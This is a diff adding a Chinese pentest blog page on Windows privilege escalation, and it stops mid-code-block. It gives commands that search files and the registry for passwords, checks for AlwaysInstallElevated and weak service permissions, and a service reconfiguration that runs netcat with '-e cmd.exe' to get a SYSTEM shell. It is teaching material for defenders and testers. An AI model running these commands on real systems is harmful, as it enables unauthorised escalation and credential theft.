@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="常见提权思路 123456781.服务配置错误2.文件或服务权限漏洞3.内核漏洞4.高权限运行的服务漏洞5.敏感信息泄漏6.总是在执行二进制文件之前提升特权的系统设置7.脚本中包含硬编码的凭证，以及许多其他内容8.高权限账号运行的服务或者计划任务，替换其执行的可执行文件  参考 1https:&#x2F;&#x2F;www.fuzzysecurity.com&#x2F;tutorials&#x2F;16.html  信息收集主要收集系统">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows Privilege Escalation">
+<meta property="og:url" content="http://example.com/2024/04/08/WindowsPrivilegeEscalation/index.html">
+<meta property="og:site_name" content="B00ze Escape">
+<meta property="og:description" content="常见提权思路 123456781.服务配置错误2.文件或服务权限漏洞3.内核漏洞4.高权限运行的服务漏洞5.敏感信息泄漏6.总是在执行二进制文件之前提升特权的系统设置7.脚本中包含硬编码的凭证，以及许多其他内容8.高权限账号运行的服务或者计划任务，替换其执行的可执行文件  参考 1https:&#x2F;&#x2F;www.fuzzysecurity.com&#x2F;tutorials&#x2F;16.html  信息收集主要收集系统">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-08T09:13:18.000Z">
+<meta property="article:modified_time" content="2024-04-08T09:22:48.329Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Windows Privilege Escalation</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/04/08/FileUploadAndDownload/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/03/31/HTB-Lame/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/08/WindowsPrivilegeEscalation/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&text=Windows Privilege Escalation"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&is_video=false&description=Windows Privilege Escalation"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Windows Privilege Escalation&body=Check out this article: http://example.com/2024/04/08/WindowsPrivilegeEscalation/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&name=Windows Privilege Escalation&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&t=Windows Privilege Escalation"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%87%AD%E6%8D%AE"><span class="toc-number">2.</span> <span class="toc-text">敏感文件泄露凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">域环境下的信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%BC%8F%E6%B4%9EAlwaysInstallElevated%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">通过注册表漏洞AlwaysInstallElevated进行提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">利用主机服务进行提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%8D%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">通过不正确的文件权限进行提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo1"><span class="toc-number">6.1.</span> <span class="toc-text">Demo1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo2"><span class="toc-number">6.2.</span> <span class="toc-text">Demo2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo3"><span class="toc-number">6.3.</span> <span class="toc-text">Demo3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC"><span class="toc-number">7.</span> <span class="toc-text">UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83"><span class="toc-number">7.1.</span> <span class="toc-text">绕过UAC提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tips"><span class="toc-number">8.</span> <span class="toc-text">Tips</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Windows Privilege Escalation
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-08T09:13:18.000Z" class="dt-published" itemprop="datePublished">2024-04-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pentest/" rel="tag">Pentest</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>常见提权思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.服务配置错误</span><br><span class="line">2.文件或服务权限漏洞</span><br><span class="line">3.内核漏洞</span><br><span class="line">4.高权限运行的服务漏洞</span><br><span class="line">5.敏感信息泄漏</span><br><span class="line">6.总是在执行二进制文件之前提升特权的系统设置</span><br><span class="line">7.脚本中包含硬编码的凭证，以及许多其他内容</span><br><span class="line">8.高权限账号运行的服务或者计划任务，替换其执行的可执行文件</span><br></pre></td></tr></table></figure>
+
+<p>参考</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.fuzzysecurity.com/tutorials/16.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要收集系统信息、网络信息、自启动服务信息等</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看系统信息</span></span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看主机名和当前用户名</span></span><br><span class="line">hostname</span><br><span class="line">echo %username%</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看本机所有用户</span></span><br><span class="line">net users</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看目标用户的权限，所在组等信息</span></span><br><span class="line">net user 用户名 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看网络信息和路由表。</span></span><br><span class="line">ipconfig /all</span><br><span class="line">route print</span><br><span class="line">arp -A</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">有效的网络连接和防火墙规则</span></span><br><span class="line">netstat -ano #查看本机的端口状态</span><br><span class="line">netsh firewall show state #查看防火墙状态</span><br><span class="line">netsh firewall show config #查看防火墙配置</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">计划任务、正在运行的进程、已启动的服务和已安装的驱动程序</span></span><br><span class="line">schtasks /query /fo LIST /v #显示所有计划任务的详细输出</span><br><span class="line">tasklist /SVC #将正在运行的进程对应到已启动的服务</span><br><span class="line">net start</span><br><span class="line">DRIVERQUERY #收集驱动信息，因为一些第三方驱动程序也包含漏洞，大部分驱动运行在ring0层，权限很高</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搜索关键字文件</span></span><br><span class="line">dir /s *pass* == *cred* == *vnc* == *.config*</span><br><span class="line">findstr /si password *.xml *.ini *.txt\</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用于 grep 注册表中的关键字，在本例中为“password”。</span></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
+
+<p>查看计划任务，重点看这里启动了哪个exe，是哪个用户启动的，这个exe我们攻击者有没有权限去修改，下次启动的时间是什么，这里就是c:\program files\windows defender\MpCmdRun.exe，是system启动的，如果能改成shell，就能拿到高权限的shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">Folder: \Microsoft\Windows Defender</span><br><span class="line">HostName:                             B33F</span><br><span class="line">TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan</span><br><span class="line">Next Run Time:                        1/22/2014 5:11:13 AM</span><br><span class="line">[..Snip..]</span><br><span class="line">Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob</span><br><span class="line">                                      -WinTask -RestrictPrivilegesScan</span><br><span class="line">[..Snip..]</span><br><span class="line">Run As User:                          SYSTEM</span><br><span class="line">[..Snip..]</span><br></pre></td></tr></table></figure>
+
+<p>使用wmic进行信息收集（win10自带），Windows 的某些默认配置不允许访问 WMIC，除非用户是在管理员组中。任何版本的 XP 都不允许从低特权帐户访问 WMIC。相反，Windows 7 Professional 和 Windows 8 Enterprise 的默认安装允许低权限用户使用 WMIC 并查询操作系统，而无需修改任何设置。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看补丁级别</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p>最好的策略是寻找权限提升漏洞并查找其各自的 KB 补丁号。 此类漏洞包括但不限于 KiTrap0D (KB979682)、MS11-011 (KB2393802)、MS10-059 (KB982799)、MS10-021 (KB979683)、MS11-080 (KB2592799)。 枚举操作系统版本和服务包后，应该找出可能存在哪些权限提升漏洞。使用 KB 补丁编号，可以 grep 已安装的补丁以查看是否缺少任何补丁。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="敏感文件泄露凭据"><a href="#敏感文件泄露凭据" class="headerlink" title="敏感文件泄露凭据"></a>敏感文件泄露凭据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">%WINDIR%\Panther\Unattend\Unattended.xml</span><br><span class="line">%WINDIR%\Panther\Unattended.xml</span><br></pre></td></tr></table></figure>
+
+<p>这些文件里可能有系统管理员配置的操作系统的账号和密码，Unattended.xml是Windows里的无人值守下的应答文件，企业环境下一个系统管理员要一次性部署很多机器，就希望实现自动化安装，就会把管理员账号的密码配置到Unattended.xml里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sysprep.inf示例，存储的是明文密码</span></span><br><span class="line"></span><br><span class="line">[GuiUnattended]</span><br><span class="line">OEMSkipRegional=1</span><br><span class="line">OemSkipWelcome=1</span><br><span class="line">AdminPassword=s3cr3tp4ssw0rd</span><br><span class="line">TimeZone=20</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sysprep.xml示例，存储的是<span class="built_in">base64</span>编码的凭据</span></span><br><span class="line"></span><br><span class="line">&lt;LocalAccounts&gt;</span><br><span class="line">    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;</span><br><span class="line">        &lt;Password&gt;</span><br><span class="line">            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</span><br><span class="line">            &lt;PlainText&gt;false&lt;/PlainText&gt;</span><br><span class="line">        &lt;/Password&gt;</span><br><span class="line">        &lt;Description&gt;Local Administrator&lt;/Description&gt;</span><br><span class="line">        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;</span><br><span class="line">        &lt;Group&gt;Administrators&lt;/Group&gt;</span><br><span class="line">        &lt;Name&gt;Administrator&lt;/Name&gt;</span><br><span class="line">    &lt;/LocalAccount&gt;</span><br><span class="line">&lt;/LocalAccounts&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Unattended.xml示例</span></span><br><span class="line"></span><br><span class="line">&lt;AutoLogon&gt;</span><br><span class="line">    &lt;Password&gt;</span><br><span class="line">        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</span><br><span class="line">        &lt;PlainText&gt;false&lt;/PlainText&gt;</span><br><span class="line">    &lt;/Password&gt;</span><br><span class="line">    &lt;Enabled&gt;true&lt;/Enabled&gt;</span><br><span class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</span><br><span class="line">&lt;/AutoLogon&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="域环境下的信息收集"><a href="#域环境下的信息收集" class="headerlink" title="域环境下的信息收集"></a>域环境下的信息收集</h2><p>域环境下很多管理员会修改组策略，通过组策略修改域内所有客户端主机的管理员密码，这么做的目的是为了收回客户端用户对机器的管理员权限，让域内用户都以普通用户的身份去登录主机。所以域管理员都会通过域控下发组策略去修改所有域内客户端计算机的管理员密码，组策略下发下去是以加密的形式把密码加密了，但是密钥已经公开。</p>
+<p>组策略实际上是xml文件。</p>
+<h2 id="通过注册表漏洞AlwaysInstallElevated进行提权"><a href="#通过注册表漏洞AlwaysInstallElevated进行提权" class="headerlink" title="通过注册表漏洞AlwaysInstallElevated进行提权"></a>通过注册表漏洞AlwaysInstallElevated进行提权</h2><p>注册表设置“AlwaysInstallElevated”，如果启用此设置，则它允许任何权限级别的用户将 *.msi 文件安装为 NT AUTHORITY\SYSTEM。 在安装msi文件的时候会赋予当前用户以系统身份安装程序的能力。</p>
+<p>需要检查是否设置了两个注册表项，如果是，则可以弹出一个 SYSTEM shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅当两个注册表项均包含 DWORD 值为 1 的“AlwaysInstallElevated”时，此操作才有效。</span></span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用主机服务进行提权"><a href="#利用主机服务进行提权" class="headerlink" title="利用主机服务进行提权"></a>利用主机服务进行提权</h2><p>通过了解 Windows 服务，使用弱权限来提权。</p>
+<p>可以使用accesschk.exe来检查权限，是 Microsoft Sysinternals Suite 中的一个工具。</p>
+<p>下载地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 使用sc来查询、配置和管理Windows服务</span><br><span class="line">sc qc Spooler</span><br><span class="line"></span><br><span class="line"># 使用 accesschk 检查每个服务所需的权限级别。</span><br><span class="line">accesschk.exe -ucqv * #列出所有服务</span><br><span class="line">accesschk.exe -ucqv Spooler</span><br></pre></td></tr></table></figure>
+
+<p>Accesschk可以自动检查我们是否对某个用户级别的Windows服务具有写权限，一定记得检查用户属于哪些用户组，例如“Power Users”被视为低权限用户组。</p>
+<p>下面是win 8和xin XP的区别</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is on Windows 8.</span></span><br><span class="line"></span><br><span class="line">C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">No matching objects found.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">On a default Windows XP SP0 we can see there is a pretty big security fail.</span></span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">RW SSDPSRV</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">RW upnphost</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">		</span><br><span class="line">C:\&gt; accesschk.exe -ucqv SSDPSRV</span><br><span class="line"></span><br><span class="line">SSDPSRV</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Power Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -ucqv upnphost</span><br><span class="line"></span><br><span class="line">upnphost</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Power Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
+
+<p>随着 XP SP2 的引入得到解决，但在 SP0 和 SP1 上它可以被用作通用本地权限提升漏洞。 通过重新配置服务，我们可以让它以系统级别权限运行我们选择的任何二进制文件。</p>
+<p>以下是针对win XP SP0和SP1的提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc upnphost</span><br><span class="line"></span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</span><br><span class="line">        DEPENDENCIES       : SSDPSRV</span><br><span class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</span><br><span class="line">		</span><br><span class="line">C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; sc qc upnphost</span><br><span class="line"></span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span 